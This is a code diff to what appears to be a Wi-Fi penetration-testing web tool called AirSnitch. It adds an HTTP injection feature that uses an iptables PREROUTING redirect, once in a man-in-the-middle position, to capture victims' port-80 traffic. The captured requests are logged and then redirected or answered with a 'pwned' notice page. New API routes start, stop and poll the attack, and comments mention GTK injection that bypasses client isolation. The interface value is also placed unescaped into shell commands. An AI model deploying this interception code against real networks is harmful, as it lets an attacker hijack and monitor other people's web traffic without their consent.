@@ -63,6 +63,10 @@ _pcap_start_time: float = 0.0
 _cred_proc: subprocess.Popen | None = None
 _cred_lines: list[str] = []
 
+# HTTP injection state (intercepts port-80 requests and serves redirect or custom page)
+_http_inject_proc: subprocess.Popen | None = None
+_http_inject_job: dict = {"status": "idle"}
+
 # GTK frame injection state (bypasses AP client isolation via 802.11 monitor-mode injection)
 _gtk_inject_proc: subprocess.Popen | None = None
 _gtk_inject_job: dict = {"status": "idle"}   # idle | running | stopped | error
@@ -1879,6 +1883,170 @@ async def api_mitm_stop(request):
     })
 
 
+# ── HTTP Content Injection ────────────────────────────────────────────────────
+#
+# When in MITM position, intercepts all port-80 HTTP requests from victims and
+# either redirects them to a URL or serves a custom HTML "pwned" page.
+# Uses iptables PREROUTING REDIRECT to capture forwarded traffic.
+# ─────────────────────────────────────────────────────────────────────────────
+
+_HTTP_INJECT_SCRIPT = r'''
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+mode   = sys.argv[1]   # "redirect" | "page" | "rickroll"
+target = sys.argv[2]   # redirect URL (ignored for "page")
+port   = int(sys.argv[3])
+
+PWNED_HTML = b"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Security Notice</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#e6edf3;font-family:monospace;
+     display:flex;align-items:center;justify-content:center;min-height:100vh}
+.wrap{max-width:700px;padding:2rem;text-align:center}
+pre{color:#3fb950;font-size:13px;line-height:1.35;margin-bottom:1.5rem;text-align:left;display:inline-block}
+h2{color:#f85149;font-size:1.3rem;margin-bottom:1rem;letter-spacing:.05em}
+p{color:#8b949e;font-size:.9rem;line-height:1.6;margin-bottom:.75rem}
+.tag{display:inline-block;background:#3fb95020;color:#3fb950;
+     border:1px solid #3fb95040;border-radius:4px;padding:.2rem .6rem;font-size:.8rem;margin-top:.5rem}
+</style>
+</head>
+<body>
+<div class="wrap">
+<pre>
+    _    ___ ____  ____  _   _ _____ _____ ____ _   _ _____  ____
+   / \  |_ _|  _ \/ ___|| \ | |_   _|_   _/ ___| | | | ____||  _ \\
+  / _ \  | || |_) \___ \|  \| | | |   | || |   | |_| |  _|  | | | |
+ / ___ \ | ||  _ < ___) | |\  | | |   | || |___|  _  | |___ | |_| |
+/_/   \_\___|_| \_\____/|_| \_| |_|   |_| \____|_| |_|_____||____/
+</pre>
+<h2>&#9888; Your HTTP traffic is being intercepted</h2>
+<p>This page was served by <strong>AirSnitch</strong> as part of an<br>
+<strong>authorized wireless penetration test</strong>.</p>
+<p>Your access point shares a <strong>Group Temporal Key (GTK)</strong> across all<br>
+connected clients, enabling broadcast ARP injection and full traffic interception.</p>
+<p>This is a confirmed security vulnerability.<br>
+Contact your network administrator for remediation.</p>
+<span class="tag">AirSnitch &#8212; Wi-Fi Client Isolation Testing</span>
+</div>
+</body>
+</html>"""
+
+intercepted = []
+
+class H(BaseHTTPRequestHandler):
+    def handle_req(self):
+        host = self.headers.get('Host', '?')
+        entry = f"{self.command} http://{host}{self.path}"
+        intercepted.append(entry)
+        print(f"[http-inject] {entry}", flush=True)
+
+        if mode in ("redirect", "rickroll"):
+            url = target if mode == "redirect" else "https://youtu.be/dQw4w9WgXcQ"
+            self.send_response(302)
+            self.send_header("Location", url)
+            self.send_header("Content-Length", "0")
+            self.end_headers()
+        else:  # "page"
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(PWNED_HTML)))
+            self.end_headers()
+            self.wfile.write(PWNED_HTML)
+
+    def do_GET(self):  self.handle_req()
+    def do_POST(self): self.handle_req()
+    def do_HEAD(self): self.handle_req()
+    def log_message(self, *a): pass
+
+print(f"[http-inject] Listening on :{port} | mode={mode}", flush=True)
+HTTPServer(("0.0.0.0", port), H).serve_forever()
+'''
+
+_HTTP_INJECT_SCRIPT_PATH = "/tmp/airsnitch_http_inject.py"
+_HTTP_INJECT_PORT = 8889
+
+
+async def api_http_inject_start(request):
+    """Start HTTP content injection — intercepts port-80 traffic and redirects or serves custom page."""
+    global _http_inject_proc, _http_inject_job
+    body = await request.json()
+    iface  = body.get("iface", "wlan0").strip()
+    if iface.endswith("mon"):
+        iface = iface[:-3]
+    mode   = body.get("mode", "rickroll").strip()   # rickroll | redirect | page
+    target = body.get("target", "https://youtu.be/dQw4w9WgXcQ").strip()
+
+    # Kill existing
+    if _http_inject_proc and _http_inject_proc.poll() is None:
+        _http_inject_proc.terminate()
+        try: _http_inject_proc.wait(timeout=3)
+        except subprocess.TimeoutExpired: _http_inject_proc.kill()
+
+    # iptables: redirect forwarded port-80 TCP to our local inject server
+    run(f"iptables -t nat -D PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port {_HTTP_INJECT_PORT} 2>/dev/null", timeout=5)
+    rc_ipt, out_ipt = run(f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port {_HTTP_INJECT_PORT}", timeout=5)
+    if rc_ipt != 0:
+        return web.json_response({"error": f"iptables failed: {out_ipt}"}, status=500)
+
+    # Write and launch inject server
+    with open(_HTTP_INJECT_SCRIPT_PATH, "w") as f:
+        f.write(_HTTP_INJECT_SCRIPT)
+
+    _http_inject_proc = subprocess.Popen(
+        [sys.executable, _HTTP_INJECT_SCRIPT_PATH, mode, target, str(_HTTP_INJECT_PORT)],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+    )
+    _http_inject_job = {"status": "running", "mode": mode, "target": target,
+                         "iface": iface, "lines": [], "count": 0}
+
+    def _read():
+        for line in iter(_http_inject_proc.stdout.readline, ""):
+            line = line.rstrip()
+            _http_inject_job["lines"].append(line)
+            if "[http-inject]" in line and "Listening" not in line:
+                _http_inject_job["count"] = _http_inject_job.get("count", 0) + 1
+            if len(_http_inject_job["lines"]) > 300:
+                _http_inject_job["lines"] = _http_inject_job["lines"][-300:]
+        _http_inject_job["status"] = "stopped"
+    threading.Thread(target=_read, daemon=True).start()
+
+    append_log(f"[http-inject] Started | mode={mode} | iface={iface} | port={_HTTP_INJECT_PORT}")
+    return web.json_response({"started": True, "port": _HTTP_INJECT_PORT, "mode": mode})
+
+
+async def api_http_inject_stop(request):
+    """Stop HTTP injection and remove iptables rule."""
+    global _http_inject_proc, _http_inject_job
+    iface = _http_inject_job.get("iface", "wlan0")
+    if _http_inject_proc and _http_inject_proc.poll() is None:
+        _http_inject_proc.terminate()
+        try: _http_inject_proc.wait(timeout=5)
+        except subprocess.TimeoutExpired: _http_inject_proc.kill()
+    run(f"iptables -t nat -D PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port {_HTTP_INJECT_PORT} 2>/dev/null", timeout=5)
+    _http_inject_job["status"] = "stopped"
+    append_log(f"[http-inject] Stopped. {_http_inject_job.get('count', 0)} requests intercepted.")
+    return web.json_response({"stopped": True,
+                               "count": _http_inject_job.get("count", 0),
+                               "lines": _http_inject_job.get("lines", [])[-50:]})
+
+
+async def api_http_inject_poll(request):
+    """Poll HTTP injection status."""
+    running = bool(_http_inject_proc and _http_inject_proc.poll() is None)
+    return web.json_response({
+        "status":  _http_inject_job.get("status", "idle"),
+        "running": running,
+        "count":   _http_inject_job.get("count", 0),
+        "lines":   _http_inject_job.get("lines", [])[-30:],
+        "mode":    _http_inject_job.get("mode", ""),
+    })
+
+
 # ── GTK Frame Injection ───────────────────────────────────────────────────────
 #
 # Forges broadcast ARP replies encrypted with the shared GTK and injects them
@@ -2673,6 +2841,11 @@ def create_app():
     # AirSnitch GTK Check (single NIC — calls airsnitch-run)
     app.router.add_post("/api/airsnitch/gtk-check", api_gtk_check)
     app.router.add_get("/api/airsnitch/gtk-poll", api_gtk_poll)
+
+    # HTTP Content Injection
+    app.router.add_post("/api/pentest/http-inject-start", api_http_inject_start)
+    app.router.add_post("/api/pentest/http-inject-stop",  api_http_inject_stop)
+    app.router.add_get("/api/pentest/http-inject-poll",   api_http_inject_poll)
 
     # GTK Frame Injection
     app.router.add_post("/api/pentest/gtk-inject-start", api_gtk_inject_start)
